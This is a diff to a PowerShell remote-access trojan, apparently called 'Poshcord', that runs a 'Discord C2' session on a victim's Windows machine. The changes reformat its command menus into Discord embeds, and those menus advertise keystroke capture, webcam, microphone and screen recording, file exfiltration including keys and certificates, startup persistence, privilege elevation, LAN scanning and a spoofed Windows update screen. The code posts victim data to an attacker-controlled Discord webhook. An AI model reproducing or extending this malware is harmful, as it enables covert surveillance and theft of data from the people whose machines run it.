@@ -102,9 +102,7 @@ function PullMsg {
         Write-Output "No messages found in the channel."
     }
 }
-
 PullMsg
-
 $previouscmd = $response
 
 $noraw = $ghurl -replace "/raw", ""
@@ -114,7 +112,13 @@ $jsonPayload = @{
     embeds     = @(
         @{
             title       = "$env:COMPUTERNAME | C2 session started!"
-            description = "Enter Commands Here - $noraw"
+            "description" = @"
+**Enter Commands Here**
+
+Try : ``options`` for a list of commands 
+Use ``close`` to stop the session
+     
+"@
             color       = 16711680
             author      = @{
                 name     = "egieb"
@@ -130,74 +134,96 @@ $jsonPayload = @{
 $jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
 Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'
 
-Function Options{
-$msgsys = "``========================================================
-================== Discord C2 Options ==================
-========================================================
-= Commands List -                                      =
-========================================================
-= Message : Send a message window to the User          =
-= SpeechToText  : Send audio transcript to Discord     =
-= Screenshot  : Sends a screenshot of the desktop      =
-= Keycapture   : Capture Keystrokes and send           =
-= Exfiltrate : Send various files. (see ExtraInfo)     =
-= Upload : Upload a file. (see ExtraInfo)              =
-= Systeminfo : Send System info as text file.          =
-= RecordAudio  : Record microphone to Discord          =
-= RecordScreen  : Record Screen to Discord             =
-= TakePicture : Send a webcam picture.                 =
-= FolderTree : Save folder trees to file and send.     =
-= FakeUpdate : Spoof windows update screen.            =
-= AddPersistance : Add this script to startup.         =
-= RemovePersistance : Remove from startup              =
-= IsAdmin  : Check if the session is admin             =
-= AttemptElevate : Attempt to restart script as admin  =
-= EnumerateLAN  : Show devices on LAN (see ExtraInfo)  =
-= NearbyWifi  : Show nearby wifi networks              =
-= SendHydra  : Never ending popups (use killswitch)    =
-= Close  : Close this Session                          =
-========================================================
-= Examples and Info -                                  =
-========================================================
-= __To Exit Exfiltrate or KeyCapture or SpeechToText__ =
-= Edit your hosted file to contain 'kill'              =
-= this will exit the current function eg. 'keycapture' =
-========================================================``"
-$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Function Options {
+    $embed = @{
+        "title" = "Discord C2 Options"
+        "description" = @"
+``````Commands List:``````
+- **Message**: Send a message window to the User (!user popup!)
+- **SpeechToText**: Send audio transcript to Discord
+- **Systeminfo**: Send System info as text file to Discord
+- **FolderTree**: Save folder trees to file and send to Discord
+- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
+- **NearbyWifi**: Show nearby wifi networks (!user popup!)
+
+- **AddPersistance**: Add this script to startup.
+- **RemovePersistance**: Remove Poshcord from startup
+- **IsAdmin**: Check if the session is admin
+- **AttemptElevate**: Attempt to restart script as admin (!user popup!)
+
+- **RecordAudio**: Record microphone and send to Discord
+- **RecordScreen**: Record Screen and send to Discord
+- **TakePicture**: Send a webcam picture and send to Discord
+- **Exfiltrate**: Send various files. (see ExtraInfo)
+- **Upload**: Upload a file. (see ExtraInfo)
+- **Screenshot**: Sends a screenshot of the desktop and send to Discord
+- **Keycapture**: Capture Keystrokes and send to Discord
+
+- **FakeUpdate**: Spoof windows update screen using Chrome
+- **SendHydra**: Never ending popups (use killswitch) to stop
+
+- **ExtraInfo**: Get a list of further info and command examples
+- **Kill**: Stop a running Module (eg. Keycapture / Exfiltrate)
+- **Close**: Close this Session
+
+
+``````Examples and Info:``````
+- To Exit Exfiltrate or KeyCapture or SpeechToText use **Kill**
+- To use Exfiltrate
+"@
+        "color" = 16711680  # Red color
+    }
+
+    $jsonsys = @{
+        "username" = $env:COMPUTERNAME
+        "embeds" = @($embed)
+    } | ConvertTo-Json
+
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
-Function ExtraInfo{
-$msgsys = "``=========  Exfiltrate Command Examples ==================
-= ( Exfiltrate -Path Documents -Filetype png )          =
-= ( Exfiltrate -Filetype log )                          =
-= ( Exfiltrate )                                        =
-= Exfiltrate only will send many pre-defined filetypes  =
-= from all User Folders like Documents, Downloads etc.. =
-= ----------------------------------------------------- =
-= PATH                                                  =
-= Documents, Desktop, Downloads,                        =
-= OneDrive, Pictures, Videos.                           =
-= FILETYPE                                              =
-= log, db, txt, doc, pdf, jpg, jpeg, png,               =
-= wdoc, xdoc, cer, key, xls, xlsx,                      =
-= cfg, conf, docx, rft.                                 =
-===================  Upload Command Example =============
-= ( Upload -Path C:/Path/To/File.txt )                  =
-= Use 'Folder-Tree' command to show all files           =
-=================  Enumerate-LAN Example ================
-( Enumerate-LAN -Prefix 192.168.1. )                    =
-This Eg. will scan 192.168.1.1 to 192.168.1.254         =
-==================  Message Example =====================
-( Message 'Your Message Here!' )                        =
-================== Record Examples ======================
-( RecordAudio -t 100 ) number of seconds to record      =
-( RecordScreen -t 100 ) number of seconds to record     =
-=========================================================``"
-$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
+Function ExtraInfo {
+$embed = @{
+    "title" = "Exfiltrate and Upload Command Examples"
+    "description" = @"
+**Default PS Commands:**
+> PS> ``whoami`` (Returns Powershell commands)
+
+**Exfiltrate Command Examples:**
+> PS> ``Exfiltrate -Path Documents -Filetype png``
+> PS> ``Exfiltrate -Filetype log``
+> PS> ``Exfiltrate``
+
+Exfiltrate only will send many pre-defined filetypes
+from all User Folders like Documents, Downloads etc..
+
+**Upload Command Example:**
+> PS> ``Upload -Path C:/Path/To/File.txt``
+
+Use 'Folder-Tree' command to show all files
+
+**Enumerate-LAN Example:**
+> PS> ``Enumerate-LAN -Prefix 192.168.1.``
+
+This Eg. will scan 192.168.1.1 to 192.168.1.254
+
+**Message Example:**
+> PS> ``Message 'Your Message Here!'``
+
+**Record Examples:**
+> PS> ``Record-Audio -t 100`` (number of seconds to record)
+> PS> ``Record-Screen -t 100`` (number of seconds to record)
+"@
+    "color" = 16711680  # Red color
+}
+
+$json = @{
+    "username" = $env:COMPUTERNAME
+    "embeds" = @($embed)
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json
 }
 
 Function FolderTree{
@@ -931,7 +957,6 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 while($true){
 
     PullMsg
-
     if (!($response -like "$previouscmd")) {
     Write-Output "Command found!"
         if ($response -like "close") {
